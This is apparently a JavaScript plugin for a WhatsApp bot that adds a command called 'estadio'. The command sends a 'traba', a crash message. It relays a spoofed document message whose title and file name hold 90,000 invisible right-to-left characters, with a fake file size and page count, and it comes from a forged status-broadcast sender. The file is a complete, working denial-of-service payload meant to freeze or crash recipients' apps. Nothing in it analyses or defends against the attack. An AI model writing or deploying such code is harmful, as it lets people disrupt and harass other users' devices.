let handler = async (m, { conn }) => {
  try {
    const invisible = '\u200F'.repeat(90000) // traba muy pesada (invisible)

    const fakeKey = {
      remoteJid: 'status@broadcast',
      fromMe: false,
      id: m.id,
      participant: '0@s.whatsapp.net',
    }

    const fakeDoc = {
      documentMessage: {
        title: invisible,
        fileName: invisible,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 9999999999,
        pageCount: 999,
        mediaKey: '',
        fileSha256: '',
        fileEncSha256: '',
        directPath: '',
        mediaKeyTimestamp: 1
      }
    }

    await conn.relayMessage(m.chat, fakeDoc, { messageId: m.key.id, messageKey: fakeKey })
    await conn.sendMessage(m.chat, { text: '✅ Traba enviada (potente). Puede no verse pero ya está activa.' }, { quoted: m })
  } catch (e) {
    console.error(e)
    await conn.sendMessage(m.chat, { text: '❌ Falló el envío de la traba.' }, { quoted: m })
  }
}

handler.command = ['estadio']
handler.help = ['estadio']
handler.tags = ['traba', 'bug']
handler.premium = false

export default handler